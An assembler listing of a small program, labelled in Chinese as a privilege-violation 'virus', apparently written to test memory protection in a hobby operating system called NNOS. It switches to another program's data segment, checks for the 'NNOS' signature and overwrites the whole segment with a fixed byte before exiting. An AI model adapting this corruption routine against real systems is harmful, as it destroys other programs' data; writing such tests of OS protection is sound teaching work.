     1 00000000                                 ;应用程序段越权病毒
     2 00000000                                 [FORMAT "WCOFF"]
     3 00000000                                 [INSTRSET "i486p"]
     4 00000000                                 [BITS 32]
     5 00000000                                 [FILE "crack07.nas"]
     6 00000000                                 
     7 00000000                                 		GLOBAL	_NNOSMain
     8 00000000                                 
     9                                          [SECTION .text]
    10 00000000                                 
    11 00000000                                 _NNOSMain:
    12 00000000 66 B8 1F68                      		MOV		AX,1005*8
    13 00000004 8E D8                           		MOV		DS,AX
    14 00000006 3E 81 3D 00000004 534F4E4E      		CMP		DWORD [DS:0x0004],'NNOS'
    15 00000011 75 19                           		JNE		fin					
    16 00000013                                 
    17 00000013 3E 8B 0D 00000000               		MOV		ECX,[DS:0x0000]
    18 0000001A 66 B8 3EA8                      		MOV		AX,2005*8
    19 0000001E 8E D8                           		MOV		DS,AX
    20 00000020                                 
    21 00000020                                 crackloop:	
    22 00000020 83 C1 FF                        		ADD		ECX,-1
    23 00000023 3E C6 01 7B                     		MOV		BYTE [DS:ECX],123
    24 00000027 83 F9 00                        		CMP		ECX,0
    25 0000002A 75 F4                           		JNE		crackloop
    26 0000002C                                 
    27 0000002C                                 fin:
    28 0000002C BA 00000004                     		MOV		EDX,4
    29 00000031 CD 40                           		INT		0x40
